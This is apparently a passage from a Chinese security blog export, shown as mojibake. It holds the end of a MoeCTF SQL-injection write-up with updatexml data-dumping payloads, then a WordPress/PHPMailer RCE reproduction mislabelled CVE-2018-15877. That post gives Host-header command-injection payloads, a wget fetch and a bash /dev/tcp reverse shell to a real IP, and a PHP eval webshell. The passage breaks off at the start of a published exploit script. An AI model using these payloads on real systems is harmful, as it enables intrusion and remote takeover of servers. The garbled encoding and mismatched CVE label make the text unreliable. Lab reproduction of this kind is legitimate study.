ä¸ªæ•°æ®æ”¾åˆ°æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œçœ‹æ˜¯å¦ä¼šè¿”å›ç»“æœï¼Œä»¥æ­¤åˆ¤æ–­æ˜¯å¦æŸ¥è¯¢æˆåŠŸï¼Œé‚£è¿™é‡Œä¼°è®¡å°±æ˜¯æŠ¥é”™æ³¨å…¥äº†ã€‚ é‚£æˆ‘ä»¬å…ˆæ‰¾ä¸€ä¸‹æ³¨å…¥ç‚¹ï¼Œåœ¨æˆ‘ä»¬ä»¥æ­¤è¾“å…¥ipï¼Œuaå¤´ä»¥åŠtimeæ—¶ï¼Œä½ ä¼šå‘ç°ä½ åœ¨ä¿®æ”¹timeä¸ºæ¶æ„sqlè¯­å¥æ—¶ï¼Œé¡µé¢å†…å®¹ä¼šæœ‰æ‰€å˜åŒ–ï¼Œé‚£æˆ‘ä»¬ç ”ç©¶ä¸€ä¸‹timeå°±å¯ä»¥äº†ã€‚ ç ”ç©¶è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºçœ‹é—­åˆæ–¹å¼ï¼Œåˆ¤æ–­åˆ—æ•°å•¥çš„ï¼Œä¸è¿‡å¦‚ä¸‹å›¾ï¼Œè®©æˆ‘ä¸æ¸…æ¥šå…¶æ‰§è¡Œæ–¹å¼äº†ï¼Œç„¶åå°±æ”¾å¼ƒäº† ![image-20230831104607061](MoeCTF 2023-wp/image-20230831104607061.png) ![image-20230831105022384](MoeCTF 2023-wp/image-20230831105022384.png) ç¬¬äºŒå¤©å›æ¥åˆæµ…è¯•äº†å‡ ä¸‹ï¼Œæƒ³ç€è¦ä¸åˆ«ç®¡å…¶ä»–ï¼Œç›´æ¥ä¸Šdatabase()çœ‹çœ‹ï¼Œç»“æœçœŸå°±è¡Œäº† ![image-20230831105215902](MoeCTF 2023-wp/image-20230831105215902.png) è¿™è®©æˆ‘æ„Ÿè§‰ï¼Œåœ¨æˆ‘ä»¬è¾“å…¥timeå†…å®¹çš„æ—¶å€™ï¼Œä¼¼ä¹åªæœ‰ç¬¬ä¸€ä½ä¼šè¢«æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯1â€™ database()ä¹‹ç±»çš„ï¼Œä»–åªä¼šæ‰§è¡Œ1æ‰€åœ¨ä½ç½®ï¼Œåç»­å°±ä¸ä¼šå½“åšsqlè¯­å¥äº†ï¼Œè¿™åˆè®©æˆ‘è®¤ä¸ºä¼°è®¡æ˜¯sqlé¢„ç¼–è¯‘çš„é—®é¢˜å—ï¼Ÿæˆ‘ä¹Ÿæ²¡æœ‰æ·±ç©¶äº†ï¼Œéšåå°±ç›´æ¥å¼€å§‹æŠ¥é”™æ³¨å…¥ï¼Œè¿™é‡Œé‡‡ç”¨updatexmlå‡½æ•° çˆ†è¡¨åï¼š time=updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) è¿™é‡Œå¦‚ä¸‹å›¾ï¼Œä¼šçœ‹åˆ°æ•æ„Ÿè¯æ±‡secretï¼Œé‚£ä¼°è®¡è¿™å°±æ˜¯flagæ‰€åœ¨åœ°ã€‚ ![image-20230831105450883](MoeCTF 2023-wp/image-20230831105450883.png) çˆ†åˆ—åï¼š time=updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='secret_of_kokomi'),0x7e),1) ![image-20230831105648072](MoeCTF 2023-wp/image-20230831105648072.png) çˆ†å†…å®¹ï¼š time=updatexml(1,concat(0x7e,(select group_concat(content)from secret_of_kokomi),0x7e),1) ![image-20230831105732145](MoeCTF 2023-wp/image-20230831105732145.png) åŸæœ¬æˆ‘ä»¥ä¸ºæ‰¾ä¸åˆ°äº†ï¼Œç»“æœä¸€æƒ³è¦æ³¨æ„æŠ¥é”™æ³¨å…¥åšå¤šèƒ½æ˜¾ç¤º32ä½å­—ç¬¦ã€‚äºæ˜¯æˆ‘æ¥ç€çˆ† time=updatexml(1,concat(0x7e,(select substring(group_concat(content),30,60)from secret_of_kokomi),0x7e),1) time=updatexml(1,concat(0x7e,(select substring(group_concat(content),80,110)from secret_of_kokomi),0x7e),1) ![image-20230831105847585](MoeCTF 2023-wp/image-20230831105847585.png) çœ‹åˆ°äº†flagï¼Œæ¥ä¸‹æ¥å°±æ”¹å˜æ•°å­—å¾—åˆ°å®Œæ•´çš„å³å¯ moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)","path":"/2023/08/25/wordpress-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2018-15877/","content":"0x01 æ¼æ´ç®€è¿° WordPress æ˜¯ä¸€ç§ä½¿ç”¨ PHP è¯­è¨€å¼€å‘çš„åšå®¢å¹³å°ï¼Œç”¨æˆ·å¯ä»¥åœ¨æ”¯æŒ PHP å’Œ MySQL æ•°æ®åº“çš„æœåŠ¡å™¨ä¸Šæ¶è®¾å±äºè‡ªå·±çš„ç½‘ç«™ã€‚ä¹Ÿå¯ä»¥æŠŠ WordPress å½“ä½œä¸€ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰æ¥ä½¿ç”¨ã€‚WordPress ä½¿ç”¨ PHPMailer ç»„ä»¶å‘ç”¨æˆ·å‘é€é‚®ä»¶ã€‚PHPMailer (ç‰ˆæœ¬ &lt; 5.2.18) å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…åªéœ€å·§å¦™åœ°æ„é€ å‡ºä¸€ä¸ªæ¶æ„é‚®ç®±åœ°å€ï¼Œå³å¯å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„å±å®³ã€‚ æ¼æ´ç¼–å·ï¼š CVE-2016-10033 å½±å“ç‰ˆæœ¬ï¼š WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18 æ¼æ´è§¦å‘æ¡ä»¶ï¼š PHP æ²¡æœ‰å¼€å¯ safe_modeï¼ˆé»˜è®¤ï¼‰ æ”»å‡»è€…éœ€è¦çŸ¥é“ Web æœåŠ¡éƒ¨ç½²çš„è·¯å¾„ æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥è¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚ 0x02 æ¼æ´æ­å»º è¿™é‡Œæˆ‘é‡‡ç”¨vulhubé¶åœºæ­å»º è¿›å…¥åˆ°/vulhub/wordpress/pwnscriptum/ç›®å½•åï¼Œæˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼š docker-compose up -d è®¿é—®å¯¹åº”ç«¯å£å³å¯ï¼Œè®°å¾—å®‰å…¨ç»„æ”¾è¡Œã€‚è¿›å»ä¹‹åæŒ‰è¦æ±‚é…ç½®ä¿¡æ¯å³å¯ï¼Œéšååœ¨è½¬åˆ°å¿˜è®°å¯†ç é¡µé¢ 0x03 æ¼æ´åŸç† ![image-20230829150129261](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829150129261.png) æ­¤å¤„æ˜¯ç®¡ç†å‘˜é‡ç½®å¯†ç é¡µé¢ï¼Œwordpressä½¿ç”¨phpmailerç»„ä»¶è¿›è¡Œé‡ç½®å¯†ç é‚®ä»¶çš„å‘é€ï¼Œä½†æ˜¯phpmailer &lt; 5.2.18ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå…·ä½“ä½ å¯ä»¥å…ˆé˜…è¯»åˆ†ææ–‡ç« é“¾æ¥ ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªæ¼æ´åœ¨wordpressä¸­çš„æƒ…å†µã€‚æ¼æ´æ–‡ä»¶æ˜¯class.phpmailer.phpï¼Œæˆ‘ä»¬åœ¨wordpressä¸­æœç´¢æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åœ¨åœ¨wp-includesç›®å½•ä¸‹ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°å‡ è¡Œå…³é”®ä»£ç ï¼š /** * Which method to use to send mail. * Options: \"mail\", \"sendmail\", or \"smtp\". * @var string */ public $Mailer = 'mail'; /** * The path to the sendmail program. * @var string */ public $Sendmail = '/usr/sbin/sendmail'; æˆ‘ä»¬å‘ç°ï¼Œå®é™…ä¸Šphpmailerç»„ä»¶æ˜¯è°ƒç”¨linuxç³»ç»Ÿå‘½ä»¤sendmailè¿›è¡Œé‚®ä»¶å‘é€ï¼Œå‘½ä»¤æ ¼å¼ä¸ºï¼šsendmail -t -i -fusername@hostnameã€‚å¹¶ä¸”æˆ‘ä»¬ç»§ç»­å®¡è®¡ä»£ç å‘ç°ï¼š /** * Get the server hostname. * Returns 'localhost.localdomain' if unknown. * @access protected * @return string */ protected function serverHostname() { $result = 'localhost.localdomain'; if (!empty($this-&gt;Hostname)) { $result = $this-&gt;Hostname; } elseif (isset($_SERVER) and array_key_exists('SERVER_NAME', $_SERVER) and !empty($_SERVER['SERVER_NAME'])) { $result = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') &amp;&amp; gethostname() !== false) { $result = gethostname(); } elseif (php_uname('n') !== false) { $result = php_uname('n'); } return $result; } serverHostnameå‡½æ•°é€šè¿‡ä¼ å…¥çš„SERVER_NAMEå‚æ•°æ¥è·å–ä¸»æœºåï¼Œè¯¥ä¸»æœºåå³HTTPè¯·æ±‚æŠ¥æ–‡ä¸­çš„hostå€¼ï¼Œä½†æ˜¯SERVER_NAMEå‚æ•°å¹¶æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»»æ„æ„é€ æ‹¼æ¥ï¼Œä»è€Œäº§ç”Ÿäº†ç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´ã€‚ æ›´æ£’çš„æ˜¯ï¼Œsendmail æä¾›äº†-Oå’Œ-Xå‚æ•°ï¼Œ-Xå‚æ•°ç”¨äºå†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-OQueueDirectory=/tmp/ -X/tmp/smtp.phpå‘½ä»¤ç»„åˆï¼Œå®ƒä¼šå°†å‘é€çš„é‚®ä»¶ä¿å­˜åˆ°/tmp/smtp.phpä¸­ï¼Œ é‚£ä¹ˆåœ¨è¯·æ±‚çš„æ—¶å€™payloadåº”è¯¥ç±»ä¼¼äºè¿™æ ·ï¼š POST /wordpress/wp-login.php?action=lostpassword HTTP/1.1 Host: aaa( -X/tmp/smtp.php )@qq.com åœ¨@å‰é¢ï¼Œå¦‚æœåŠ ä¸Šæ‹¬å·ï¼Œå°†å¯ä»¥å¼•å…¥ç©ºæ ¼ï¼Œè¿™æ ·å°±å¯ä»¥æ‹¼æ¥åˆ°äº†sendmailå‘½ä»¤ä¸­å¹¶ä¸”ä¿å­˜äº†æµ‹è¯•é‚®ä»¶æ–‡ä»¶ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å†™å…¥çš„æ˜¯Webshellåé—¨æ–‡ä»¶å‘¢ï¼Ÿ æ€è·¯å¾ˆå¥½ï¼Œç„¶è€Œç°å®å¾ˆæ— å¥ˆã€‚ wordpressæ–¹é¢ä»¥åŠPHPMaileråº“æ–¹é¢éƒ½ä¼šé˜²æ­¢æ”»å‡»è€…æ³¨å…¥ç©ºå­—ç¬¦ï¼ˆç©ºæ ¼æˆ–TABï¼‰åˆ°sendmailå‘½ä»¤ä¸­ã€‚å¹¶ä¸”ï¼Œæ·»åŠ æ‹¬å·å¼•å…¥å‘sendmailä¸­æ³¨å…¥å‚æ•°çš„æ–¹æ³•å·²ç»è¡Œä¸é€šäº†ï¼Œå…·ä½“å¯ä»¥å‚è€ƒé“¾æ¥ã€‚ æ¯”å¦‚æˆ‘ä»¬æƒ³è¦è°ƒç”¨/bin/touchçš„æ—¶å€™ä¹Ÿä¼šå‡ºé—®é¢˜ï¼Œå› ä¸ºhostå­—æ®µä¸­å¦‚æœå‡ºç°/ï¼ŒæœåŠ¡å™¨ä¼šæ‹’ç»æˆ‘ä»¬çš„è¯·æ±‚ã€‚ å› æ­¤ä¸Šè¿°çš„SendmailæŠ€æœ¯åœ¨è¿™ç§æƒ…å†µä¸‹ä¸èµ·ä½œç”¨ï¼Œè¿™æ¡è·¯èµ°ä¸é€šäº†ï¼ æ­£æ„Ÿè§‰èµ°æŠ•æ— è·¯çš„æ—¶å€™ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä¸å¦¨å–æ¯èŒ¶å†·é™ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆsendmailèƒ½å¤Ÿäº§ç”Ÿå‘½ä»¤æ³¨å…¥æ¼æ´å‘¢ï¼Ÿæˆ‘ä»¬å»äº†è§£ä¸€ä¸‹sendmailã€‚ç„¶åå°±ä¼šå‘ç°æŸ³æš—èŠ±æ˜åˆä¸€æ‘äº†ã€‚æˆ‘ä»¬å¯ä»¥çŸ¥é“ubuntu/debainç³»ç»Ÿä¸­ï¼Œå·²ç»ä½¿ç”¨exim4æ›¿ä»£äº†sendmailçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æŸ¥çœ‹sendmailæ–‡ä»¶å¯ä»¥å‘ç°å®ƒæ˜¯ä¸€ä¸ªé“¾å‘exim4çš„è½¯é“¾æ¥æ–‡ä»¶ã€‚ ![image-20230829151151126](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829151151126.png) é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨exim4çš„è¯­æ³•å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œå‚æ•°çš„æ‹¼æ¥å•Šï¼æˆ‘ä»¬æŸ¥çœ‹exim4çš„å¸®åŠ©æ‰‹å†Œï¼Œå¯ä»¥å‘ç°-beå‚æ•° Run Exim in expansion testing mode. Exim discards its root privilege, to prevent ordinary users from using this mode to read otherwise inaccessible files. If no arguments are given, Exim runs interactively, prompting for lines of data. Otherâ€ wise, it processes each argument in turn. If Exim was built with USE_READLINE=yes in Local/Makefile, it tries to load the libreadline library dynamically whenever the -be option is used without command line arguments. If successful, it uses the readline() function, which provides extensive line-editing facilities, for reading the test data. A line history is supported. Long expansion expressions can be split over several lines by using backslash continuations. As in Exim's run time configuâ€ ration, white space at the start of continuation lines is ignored. Each argument or data line is passed through the string expansion mechanism, and the result is output. Variâ€ able values from the configuration file (for example, $qualâ€ ify_domain) are available, but no message-specific values (such as $message_exim_id) are set, because no message is being processed (but see -bem and -Mset). Note: If you use this mechanism to test lookups, and you change the data files or databases you are using, you must exit and restart Exim before trying the same lookup again. Otherwise, because each Exim process caches the results of lookups, you will just get the same result as before. Macro processing is done on lines before string-expansion: new macros can be defined and macros will be expanded. Because macros in the config file are often used for secrets, those are only available to admin users. ä¸‹é¢åŒæ ·ä¹Ÿæ˜¯${substr{10}{1}{$tod_log}}ä¸${substr{0}{1}{$spool_directory}}çš„åŸç†ï¼š æˆ‘ä»¬å¯ä»¥çŸ¥é“ubuntu/debainç³»ç»Ÿä¸­ï¼Œå·²ç»ä½¿ç”¨exim4æ›¿ä»£äº†sendmailçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æŸ¥çœ‹sendmailæ–‡ä»¶å¯ä»¥å‘ç°å®ƒæ˜¯ä¸€ä¸ªé“¾å‘exim4çš„è½¯é“¾æ¥æ–‡ä»¶ã€‚ ![image-20230825175812446](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825175812446.png) é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨exim4çš„è¯­æ³•å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œå‚æ•°çš„æ‹¼æ¥å•Šï¼æˆ‘ä»¬æŸ¥çœ‹exim4çš„å¸®åŠ©æ‰‹å†Œï¼Œå¯ä»¥å‘ç°-beå‚æ•°ï¼Œç®€å•æ¥è¯´ï¼Œ-beå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‹“å±•æµ‹è¯•å‘½ä»¤ï¼Œå®ƒå¯ä»¥è¯»å–ä¸€äº›å˜é‡çš„æ•°æ®ã€‚æ¯”å¦‚ï¼Œ$tod_logï¼Œå®ƒå¯ä»¥æ˜¾ç¤ºç³»ç»Ÿæ—¶é—´ã€‚ å¹¶ä¸”ï¼Œexim4æä¾›äº†ä¸€äº›å‡½æ•°ç”¨æ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œå¦‚å­—ç¬¦ä¸²æˆªå–å‡½æ•°substrã€$runç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚ æˆ‘ä»¬å¯ä»¥æˆªå–ç©ºæ ¼å­—ç¬¦ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œsubstrå‡½æ•°ä»ç¬¬åä¸ªå­—ç¬¦å¼€å§‹æˆªå–ï¼Œå…±æˆªå–ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æ—¶é—´å­—ç¬¦ä¸²çš„ç¬¬11ä¸ªå­—ç¬¦ï¼Œæ˜¯ç©ºæ ¼å­—ç¬¦ã€‚ ![image-20230825175901430](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825175901430.png) é‚£ä¹ˆåŒç†ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æˆªå–/å­—ç¬¦ä¸²ï¼š ![image-20230825175909679](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825175909679.png) æˆ‘ä»¬æµ‹è¯•ä½¿ç”¨$runå‡½æ•°è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ ![image-20230825175924125](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825175924125.png) åˆ°è¿™é‡Œï¼Œé‡åˆ°çš„é—®é¢˜éƒ½è§£å†³äº†ã€‚ 0x04 æ¼æ´å¤ç° EXP POST /wp-login.php?action=lostpassword HTTP/1.1 Host: target(any -froot@localhost -be ${run{ã€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‘}} null) Connection: close User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Accept: */* Content-Length: 56 Content-Type: application/x-www-form-urlencoded wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin æˆ‘ä»¬åœ¨æ•°æ®åŒ…ä¸­å°†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ’å…¥åˆ°ä¸Šè¿°payloadä¸­æŒ‡å®šçš„ä½ç½®ï¼Œå°±å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œäº†ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å­˜åœ¨å¾ˆå¤§çš„é™åˆ¶ï¼Œä¸»è¦é™åˆ¶å¦‚ä¸‹æ‰€ç¤ºï¼š 1.æ‰§è¡Œçš„å‘½ä»¤ä¸èƒ½åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚:ã€å¼•å·ç­‰ã€‚ 2.å‘½ä»¤ä¼šè¢«è½¬æ¢æˆå°å†™å­—æ¯ 3.å‘½ä»¤éœ€è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ 4.éœ€è¦çŸ¥é“æŸä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·çš„ç”¨æˆ·å 5.æˆ‘ä»¬å¤„ç†åçš„å‘½ä»¤ä¼šæ‰§è¡Œï¼Œä½†æ˜¯ä¸ä¼šæ˜¾ç¤ºåˆ°é¡µé¢ä¸Šã€‚ ä¸ºäº†è§£å†³è¿™äº›å‘ï¼Œæ¼æ´ä½œè€…æƒ³å‡ºäº†ï¼Œåˆ©ç”¨ ${substr{0}{1}{$spool_directory}} ä»£æ›¿ / ï¼Œç”¨ ${substr{10}{1}{$tod_log}} ä»£æ›¿ç©ºæ ¼çš„æ–¹æ³•ã€‚ ä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šå­—ç¬¦ä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å¾…æ‰§è¡Œçš„å‘½ä»¤æ”¾åˆ°ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œç„¶åé€šè¿‡ curl -o /tmp/rce example.com/shell.sh çš„æ–¹æ³•å…ˆå°†ä»–ä¸‹è½½åˆ° /tmp ç›®å½•ä¸­ï¼Œå†å»æ‰§è¡Œã€‚ åˆ©ç”¨ æ‰€ä»¥ï¼Œæ€»ä½“æ¥è¯´åˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š ç¼–å†™åå¼¹ shell çš„ expï¼Œæ”¾åˆ°æŸä¸ªç½‘é¡µé‡Œã€‚æœ‰å¦‚ä¸‹è¦æ±‚ï¼š æ•´ä¸ª url çš„å¤§å†™å­—æ¯ä¼šè¢«è½¬æ¢æˆå°å†™ï¼Œæ‰€ä»¥å¤§å†™å°æ•æ„Ÿçš„ç³»ç»Ÿä¸è¦ä½¿ç”¨å¤§å†™å­—æ¯åšæ–‡ä»¶è·¯å¾„ è®¿é—®è¯¥ç½‘é¡µä¸èƒ½è·³è½¬ï¼Œå› ä¸º follow è·³è½¬çš„å‚æ•°æ˜¯ -L ï¼ˆå¤§å†™ï¼‰ æ‹¼æ¥æˆå‘½ä»¤ /usr/bin/curl -o/tmp/rce example.com/shell.sh å’Œå‘½ä»¤ /bin/bash /tmp/rce å°†ä¸Šè¿°å‘½ä»¤ä¸­çš„ç©ºæ ¼å’Œ / è½¬æ¢æˆ ${substr{10}{1}{$tod_log}} å’Œ ${substr{0}{1}{$spool_directory}} æ‹¼æ¥æˆ HTTP åŒ…çš„ Host å¤´ï¼š target(any -froot@localhost -be ${run{command}} null) ä¾æ¬¡å‘é€è¿™ä¸¤ä¸ªæ‹¼æ¥å¥½çš„æ•°æ®åŒ… å¤ç° æ¼æ´ç¼ºé™·å¤„åœ¨åå°æ‰¾å›å¯†ç çš„åœ°æ–¹ åˆå§‹åŒ–ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç åè®¿é—® https://ip:8080/wp-login.phpï¼Œç‚¹å‡»å¿˜è®°å¯†ç ç•Œé¢ ![image-20230825180517679](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825180517679.png) è¿™é‡Œç”¨æˆ·åä¸º @1_h bcx æˆ‘ä»¬äºæ˜¯å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼Œè¯¥payloadåœ¨/tmp/ç›®å½•ä¸‹åˆ›å»ºtest.txtæ–‡ä»¶ï¼š aa(any -froot@localhost -be ${run{/bin/touch /tmp/test.txt}} null) ç©ºæ ¼ ==&gt; ${substr{10}{1}{$tod_log}} / ==&gt; ${substr{0}{1}{$spool_directory}} è½¬æ¢è¿‡æ¥å°±æ˜¯ aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}test.txt}} null) ![image-20230825191914211](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825191914211.png) åœ¨/tmpç›®å½•ä¸‹å‘ç°æˆåŠŸç”Ÿæˆäº†æµ‹è¯•æ–‡ä»¶ã€‚ ![image-20230825191840698](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825191840698.png) åå¼¹ shell åˆ©ç”¨ curl æˆ–è€… wget å‘½ä»¤ä¸‹è½½è¿œç¨‹æ–‡ä»¶ æµ‹è¯•ä¸‹è½½åå¼¹ shellï¼š æ³¨æ„ï¼š æ”»å‡»æœºå¯ç”¨ http æœåŠ¡ è¿œç¨‹ URL ä¸­ä¸èƒ½æœ‰ http:// æ‰€æœ‰å­—æ¯å¿…é¡»å°å†™ è¿œç¨‹åå¼¹shellè„šæœ¬ï¼šip/a.txtï¼Œå†…å®¹ï¼š bash -i &gt;&amp; /dev/tcp/124.220.233.26/12345 0&gt;&amp;1 payloadï¼š /usr/bin/wget --output-document /tmp/rce 124.220.233.26/a.txt æ‰§è¡Œåå¼¹shellï¼š /bin/bash /tmp/rce ä¸¤ä¸ªpayloadè½¬æ¢è¿‡æ¥å°±æ˜¯ aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}124.220.233.26${substr{0}{1}{$spool_directory}}a.txt}} null) aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null) åœ¨åå¼¹ä¸»æœºä¸Šç”¨ncç›‘å¬1337ç«¯å£ï¼Œåˆ†åˆ«æŒ‰é¡ºåºæäº¤payloadå³å¯è·å–åˆ°åå¼¹shell nc -lvnp 12345 ![image-20230829162742888](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230829162742888.png) å†™å…¥ä¸€å¥è¯webshell 1.txtå†…å®¹ï¼š &lt;?php @eval($_POST[1]);?&gt; åŒç†ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½ä¸€å¥è¯webshellï¼Œç„¶åèœåˆ€è¿æ¥ã€‚payloadï¼š payloadï¼š aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /var/www/html/1.php 124.220.233.26/1.txt}} null) è½¬æ¢è¿‡æ¥å³ aa(any -froot@localhost -be ${run{aa(any${substr{10}{1}{$tod_log}}-froot@localhost${substr{10}{1}{$tod_log}}-be${substr{10}{1}{$tod_log}}${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}var${substr{0}{1}{$spool_directory}}www${substr{0}{1}{$spool_directory}}html${substr{0}{1}{$spool_directory}}1.php${substr{10}{1}{$tod_log}}ip${substr{0}{1}{$spool_directory}}1.txt}}${substr{10}{1}{$tod_log}}null)}} null) ![image-20230825203125950](WordPress è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°(CVE-2018-15877)/image-20230825203125950.png) 0x05 POC è‡ªåŠ¨åŒ–æäº¤ payloadï¼Œè·å–åå¼¹ shellã€‚é€šè¿‡ python -mSimpleHTTPServer 80 å»ºç«‹ web æœåŠ¡ï¼Œç”¨äºç›®æ ‡ä¸‹è½½ shellã€‚è¿è¡Œæ˜¯éœ€è¦ç”¨ç®¡ç†å‘˜æƒé™ï¼Œå› ä¸ºç›‘å¬äº† 80 ç«¯å£ã€‚ ä½¿ç”¨æ–¹æ³• æ”»å‡»æœºä¸Šè¿è¡Œ./exp.sh [http://xx.xx.xx.xx/](http://xx.xx.xx.xx/)å³å¯ å…¶ä¸­xx.xx.xx.xxä¸ºé¶æœºwordpressçš„æ ¹åœ°å€ #!/bin/bash # # __ __ __ __ __ # / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________ # / / / _ \\/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/ # / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ ) # /_____/\\___/\\__, /\\__,_/_/ /_/ /_/\\__,_/\\___/_/|_|\\___/_/ /____/ # /____/ # # # WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit # CVE-2016-10033 # # wordpress-rce-exploit.sh (ver. 1.0) # # # Discovered and coded by # # Dawid Golunski (@dawid_golunski) # https://legalhackers.com # # ExploitBox project: # https://ExploitBox.io # # Full advisory URL: # https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html # # Exploit src URL: # https://exploitbox.io/exploit/wordpress-rce-exploit.sh # # # Tested on WordPress 4.6: # https://github.com/WordPress/WordPress/archive/4.6.zip # # Usage: # ./wordpress-rce-exploit.sh target-wordpress-url # # # Disclaimer: # For testing purposes only # # # ----------------------------------------------------------------- # # Interested in vulns/exploitation? # # # .;lc' # .,cdkkOOOko;. # .,lxxkkkkOOOO000Ol' # .':oxxxxxkkkkOOOO0000KK0x:' # .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;. # ':oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl. # '';ldxxxxxdc,. 